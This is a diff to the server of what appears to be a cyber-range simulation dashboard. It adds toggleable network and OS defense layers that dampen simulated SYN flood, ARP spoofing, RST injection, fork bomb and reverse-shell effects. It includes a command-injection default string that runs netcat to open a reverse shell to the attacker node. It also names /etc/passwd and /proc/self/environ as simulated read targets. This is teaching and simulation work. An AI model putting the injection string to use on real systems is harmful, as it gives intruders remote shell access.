@@ -17,7 +17,7 @@ import type {
 import type { AttackEvent } from '@shared/schemas/attack-event';
 import { readFileSync } from 'node:fs';
 import Ajv from 'ajv';
-import { TargetDefense, isDefenseSubFlag } from './defense';
+import { TargetDefense, isDefenseSubFlag, isDefenseLayerId } from './defense';
 
 const app = express();
 const server = http.createServer(app);
@@ -416,15 +416,19 @@ function updateOsAndL7FromLog(log: TelemetryLog) {
       : typeof summary.shell_cmd === 'string'
         ? summary.shell_cmd
         : `127.0.0.1; nc -e /bin/sh ${config.nodes.attacker} 4444`;
-    const blocked = (log.status_code >= 400 || log.defense_action === 'blocked' || log.defense_action === 'sanitized') && tag !== 'REVERSE_SHELL';
+    const blockedByL3 = (log.status_code >= 400 || log.defense_action === 'blocked' || log.defense_action === 'sanitized') && tag !== 'REVERSE_SHELL';
+    const blockedByL2 = defense.l2Os;
+    const blocked = blockedByL3 || blockedByL2;
     appendL7Alert({
       timestamp: ts,
       category: 'COMMAND_INJECTION',
       severity: 'CRITICAL',
       client_ip: log.client_ip,
       endpoint: log.endpoint,
-      payload_preview: `cmd="${hostParam}"`,
-      status_code: log.status_code,
+      payload_preview: blockedByL2 && !blockedByL3
+        ? `cmd="${hostParam}" [BLOCKED BY L2 OS: nologin/cgroups]`
+        : `cmd="${hostParam}"`,
+      status_code: blockedByL2 && log.status_code < 400 ? 403 : log.status_code,
       blocked,
     });
     if (!blocked) {
@@ -457,10 +461,16 @@ function updateOsAndL7FromLog(log: TelemetryLog) {
       updateFdMetrics(osL7State.fd_metrics.open_fds + 6, undefined, targetFile.includes('environ') ? '/proc/self/environ' : '/etc/passwd');
     }
   } else if (tag === 'FD_EXHAUSTION' || tag === 'FORK_BOMB') {
-    const requestedFds = typeof summary.open_fds === 'number' ? summary.open_fds : 960;
-    const maxFds = typeof summary.max_fds === 'number' ? summary.max_fds : osL7State.fd_metrics.max_fds;
-    updateFdMetrics(requestedFds, maxFds, '/tmp/fd_exhaust_hold_* (x900)');
-    osL7State.fd_metrics.process_count = tag === 'FORK_BOMB' ? 128 : Math.max(8, osL7State.fd_metrics.process_count);
+    if (defense.l2Os) {
+      // L2 OS Shield (ulimit -n 512 / cgroups pids.max=50) contains FD exhaustion and fork bomb!
+      updateFdMetrics(Math.min(180, osL7State.fd_metrics.open_fds + 24), 512);
+      osL7State.fd_metrics.process_count = Math.min(12, osL7State.fd_metrics.process_count);
+    } else {
+      const requestedFds = typeof summary.open_fds === 'number' ? summary.open_fds : 960;
+      const maxFds = typeof summary.max_fds === 'number' ? summary.max_fds : osL7State.fd_metrics.max_fds;
+      updateFdMetrics(requestedFds, maxFds, '/tmp/fd_exhaust_hold_* (x900)');
+      osL7State.fd_metrics.process_count = tag === 'FORK_BOMB' ? 128 : Math.max(8, osL7State.fd_metrics.process_count);
+    }
   } else if (tag === 'HEAVY_DOS') {
     osL7State.l7_counters.heavy_dos_count += 1;
     const iter = typeof query.iterations === 'number' ? query.iterations : 500000;
@@ -557,27 +567,39 @@ function updateTcpMetrics(log: TelemetryLog) {
   const isAttack = Boolean(log.is_suspicious || (log.attack_tag && log.attack_tag !== 'NORMAL'));
 
   if (log.attack_tag === 'SYN_FLOOD') {
-    socketMetrics.syn_recv = Math.min(socketMetrics.syn_recv + 25, 250);
+    if (defense.l1Network) {
+      // L1 Network Shield (iptables SYN_FLOOD_LIMIT) drops SYN flood packets at L4 perimeter
+      socketMetrics.syn_recv = Math.min(socketMetrics.syn_recv + 2, 18);
+    } else if (defense.l2Os) {
+      // L2 OS Shield (net.ipv4.tcp_syncookies=1) prevents half-open backlog saturation
+      socketMetrics.syn_recv = Math.min(socketMetrics.syn_recv + 6, 32);
+    } else {
+      socketMetrics.syn_recv = Math.min(socketMetrics.syn_recv + 25, 250);
+    }
   } else if (log.attack_tag === 'ARP_SPOOF') {
-    poisonArpCache();
-    extractSniffedInfoFromLog(log);
+    if (!defense.l1Network) {
+      poisonArpCache();
+      extractSniffedInfoFromLog(log);
+    }
   } else if (log.attack_tag === 'RST_INJECTION') {
-    const summary = typeof log.payload_summary === 'object' && log.payload_summary !== null
-      ? (log.payload_summary as Record<string, unknown>)
-      : {};
-    const seqNum = typeof summary.seq_num === 'number'
-      ? summary.seq_num
-      : Math.floor(100000000 + Math.random() * 900000000);
-    networkState.rst_injection = {
-      active: true,
-      disrupted_sessions: networkState.rst_injection.disrupted_sessions + 1,
-      last_rst_at: new Date().toISOString(),
-      last_seq_num: seqNum,
-      victim_ip: config.nodes.client,
-      target_ip: config.nodes.target,
-    };
-    socketMetrics.established = Math.max(1, socketMetrics.established - 4);
-    socketMetrics.time_wait = Math.min(socketMetrics.time_wait + 3, 40);
+    if (!defense.l1Network) {
+      const summary = typeof log.payload_summary === 'object' && log.payload_summary !== null
+        ? (log.payload_summary as Record<string, unknown>)
+        : {};
+      const seqNum = typeof summary.seq_num === 'number'
+        ? summary.seq_num
+        : Math.floor(100000000 + Math.random() * 900000000);
+      networkState.rst_injection = {
+        active: true,
+        disrupted_sessions: networkState.rst_injection.disrupted_sessions + 1,
+        last_rst_at: new Date().toISOString(),
+        last_seq_num: seqNum,
+        victim_ip: config.nodes.client,
+        target_ip: config.nodes.target,
+      };
+      socketMetrics.established = Math.max(1, socketMetrics.established - 4);
+      socketMetrics.time_wait = Math.min(socketMetrics.time_wait + 3, 40);
+    }
   } else if (log.attack_tag === 'HEAVY_DOS') {
     socketMetrics.established = Math.min(socketMetrics.established + 8, 120);
     socketMetrics.syn_recv = Math.min(socketMetrics.syn_recv + 5, 80);
@@ -587,8 +609,8 @@ function updateTcpMetrics(log: TelemetryLog) {
     // Lưu lượng bình thường
     socketMetrics.established = Math.max(8, Math.min(socketMetrics.established + 1, 60));
     socketMetrics.time_wait = Math.min(socketMetrics.time_wait + 1, 30);
-    // Nếu đang bị MitM ARP Spoofing, mọi request từ Client đều đi qua Hacker và bị Sniff!
-    if (networkState.mitm_active) {
+    // Nếu đang bị MitM ARP Spoofing (và Khiên L1 tắt), mọi request từ Client đều đi qua Hacker và bị Sniff!
+    if (networkState.mitm_active && !defense.l1Network) {
       extractSniffedInfoFromLog(log);
     }
   }
@@ -650,6 +672,7 @@ app.post('/api/telemetry', (req: Request, res: Response) => {
     network_state: networkState,
     os_l7_state: osL7State,
     defense_l3_state: defense.state,
+    defense_layers: defense.getLayersState(),
   });
 
   res.status(200).json({
@@ -670,6 +693,7 @@ app.get('/api/telemetry/history', (req: Request, res: Response) => {
     capacity: telemetryBuffer.getCapacity(),
     history: telemetryBuffer.getAll(),
     defense_l3_state: defense.state,
+    defense_layers: defense.getLayersState(),
     metrics: socketMetrics,
     network_state: networkState,
     os_l7_state: osL7State,
@@ -919,11 +943,54 @@ app.post('/api/telemetry/os', (req: Request, res: Response) => {
 
 /**
  * POST /api/defense/toggle
- * Chuyển tiếp (proxy) lệnh bật/tắt khiên L3/L7 tới Target App và đồng bộ hóa qua WebSocket
+ * Chuyển tiếp (proxy) lệnh bật/tắt khiên L1 (Network), L2 (OS) hoặc L3 (App) và đồng bộ hóa qua WebSocket (Task W5-T1)
  */
+function applyLayerSideEffects(layer: 'l1' | 'l2', active: boolean) {
+  if (layer === 'l1' && active) {
+    // Khi bật Khiên Mạng L1 (Static ARP + iptables): khóa cứng bảng ARP sạch, tắt MitM và hạ SYN_RECV
+    networkState.mitm_active = false;
+    networkState.arp_table = createCleanArpTable();
+    networkState.rst_injection.active = false;
+    socketMetrics.syn_recv = Math.min(socketMetrics.syn_recv, 12);
+    recordSynHistory(socketMetrics.syn_recv);
+    io.emit('NETWORK_STATE_UPDATE', {
+      network_state: networkState,
+      metrics: socketMetrics,
+    });
+  } else if (layer === 'l2') {
+    if (active) {
+      // Khi bật Khiên HĐH L2 (tcp_syncookies=1, ulimit -n 512, cgroups, nologin): ngắt Reverse Shell & giới hạn FD
+      osL7State.pstree = createCleanProcessTree();
+      osL7State.suspicious_processes = [];
+      osL7State.reverse_shell = {
+        ...osL7State.reverse_shell,
+        active: false,
+        spawned_at: null,
+        shell_cmd: null,
+        pid: null,
+      };
+      osL7State.fd_metrics.max_fds = 512;
+      osL7State.fd_metrics.process_count = 4;
+      updateFdMetrics(Math.min(osL7State.fd_metrics.open_fds, 42), 512);
+      socketMetrics.syn_recv = Math.min(socketMetrics.syn_recv, 24);
+      recordSynHistory(socketMetrics.syn_recv);
+    } else {
+      osL7State.fd_metrics.max_fds = 1024;
+      updateFdMetrics(osL7State.fd_metrics.open_fds, 1024);
+    }
+    io.emit('OS_L7_STATE_UPDATE', {
+      os_l7_state: osL7State,
+      metrics: socketMetrics,
+    });
+  }
+}
+
 function broadcastDefense() {
   const payload = {
     defense_l3_state: defense.state,
+    defense_l1_network: defense.l1Network,
+    defense_l2_os: defense.l2Os,
+    defense_layers: defense.getLayersState(),
     current_state: defense.currentState,
     proxied_to_target: defense.state !== null,
     updated_at: new Date().toISOString(),
@@ -948,7 +1015,14 @@ defensePoll.unref();
 server.on('close', () => clearInterval(defensePoll));
 
 app.post('/api/defense/toggle', async (req: Request, res: Response) => {
-  const { enabled, flag } = req.body || {};
+  const { layer, enabled, flag } = req.body || {};
+  if (layer !== undefined && !isDefenseLayerId(layer)) {
+    res.status(400).json({
+      success: false,
+      message: 'layer must be one of: l1, l2, l3',
+    });
+    return;
+  }
   if (enabled !== undefined && typeof enabled !== 'boolean') {
     res.status(400).json({ success: false, message: 'enabled must be boolean' });
     return;
@@ -960,12 +1034,37 @@ app.post('/api/defense/toggle', async (req: Request, res: Response) => {
     });
     return;
   }
+
+  // W5-T1: Bật/tắt độc lập Lớp Khiên Mạng (L1) hoặc Lớp Khiên Hệ điều hành (L2)
+  if (layer === 'l1' || layer === 'l2') {
+    const newLayerState = defense.setLayer(layer, enabled);
+    applyLayerSideEffects(layer, newLayerState);
+    broadcastDefense();
+    const label = layer === 'l1' ? 'Khiên Mạng L1 (Static ARP & iptables)' : 'Khiên HĐH L2 (Syncookies, ulimit & nologin)';
+    res.json({
+      success: true,
+      layer,
+      defense_l1_network: defense.l1Network,
+      defense_l2_os: defense.l2Os,
+      defense_l3_app: defense.state,
+      defense_layers: defense.getLayersState(),
+      current_state: defense.currentState,
+      proxied_to_target: defense.state !== null,
+      message: `${label} hiện đang: ${newLayerState ? 'BẬT (SECURED)' : 'TẮT (VULNERABLE)'}`,
+    });
+    return;
+  }
+
   try {
     await defense.change({ enabled, flag });
     broadcastDefense();
     res.json({
       success: true,
+      layer: 'l3',
+      defense_l1_network: defense.l1Network,
+      defense_l2_os: defense.l2Os,
       defense_l3_app: defense.state,
+      defense_layers: defense.getLayersState(),
       current_state: defense.currentState,
       proxied_to_target: true,
       message: `Khiên phòng thủ L3/L7 hiện đang: ${defense.state ? 'BẬT (SECURED)' : 'TẮT (VULNERABLE)'}`,
@@ -974,7 +1073,11 @@ app.post('/api/defense/toggle', async (req: Request, res: Response) => {
     broadcastDefense();
     res.status(502).json({
       success: false,
+      layer: 'l3',
+      defense_l1_network: defense.l1Network,
+      defense_l2_os: defense.l2Os,
       defense_l3_app: null,
+      defense_layers: defense.getLayersState(),
       current_state: null,
       proxied_to_target: false,
       message: 'Không xác nhận được trạng thái từ Target. Hãy kiểm tra kết nối.',
@@ -987,7 +1090,10 @@ app.get('/api/defense/status', async (_req: Request, res: Response) => {
     await defense.read();
     broadcastDefense();
     res.json({
+      defense_l1_network: defense.l1Network,
+      defense_l2_os: defense.l2Os,
       defense_l3_app: defense.state,
+      defense_layers: defense.getLayersState(),
       current_state: defense.currentState,
       target_url: config.targetAppUrl,
       proxied_to_target: true,
@@ -995,7 +1101,10 @@ app.get('/api/defense/status', async (_req: Request, res: Response) => {
   } catch {
     broadcastDefense();
     res.status(502).json({
+      defense_l1_network: defense.l1Network,
+      defense_l2_os: defense.l2Os,
       defense_l3_app: null,
+      defense_layers: defense.getLayersState(),
       current_state: null,
       proxied_to_target: false,
     });
@@ -1126,6 +1235,9 @@ io.on('connection', (socket) => {
     network_state: networkState,
     os_l7_state: osL7State,
     defense_l3_state: defense.state,
+    defense_l1_network: defense.l1Network,
+    defense_l2_os: defense.l2Os,
+    defense_layers: defense.getLayersState(),
     capacity: telemetryBuffer.getCapacity(),
   });
 
@@ -1137,11 +1249,18 @@ io.on('connection', (socket) => {
     });
   });
 
-  // Client yêu cầu toggle khiên chắn trực tiếp từ socket
-  socket.on('TOGGLE_DEFENSE', async (data?: { flag?: string; enabled?: boolean }) => {
+  // Client yêu cầu toggle khiên chắn trực tiếp từ socket (hỗ trợ cả 3 lớp L1, L2, L3)
+  socket.on('TOGGLE_DEFENSE', async (data?: { layer?: string; flag?: string; enabled?: boolean }) => {
+    const layer = data && isDefenseLayerId(data.layer) ? data.layer : 'l3';
+    const enabled = data && typeof data.enabled === 'boolean' ? data.enabled : undefined;
+    if (layer === 'l1' || layer === 'l2') {
+      const active = defense.setLayer(layer, enabled);
+      applyLayerSideEffects(layer, active);
+      broadcastDefense();
+      return;
+    }
     try {
       const flag = data && isDefenseSubFlag(data.flag) ? data.flag : undefined;
-      const enabled = data && typeof data.enabled === 'boolean' ? data.enabled : undefined;
       await defense.change({ flag, enabled });
       broadcastDefense();
     } catch {
